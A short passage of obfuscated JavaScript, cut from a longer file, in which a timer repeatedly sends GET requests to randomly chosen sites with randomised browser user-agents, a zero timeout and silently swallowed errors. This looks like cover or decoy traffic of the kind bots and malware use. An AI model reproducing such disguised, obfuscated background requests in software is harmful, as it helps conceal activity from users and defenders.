  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x35 * 0xb9 + 0x32a * -0x7 + 0xb31) * getRandomInt(-0x9ed * -0x1 + 0x25ce + -0x2fba, 0x147b + -0x2230 + 0xdba));
}, 0x5 * 0x509 + 0x103f + -0x2908);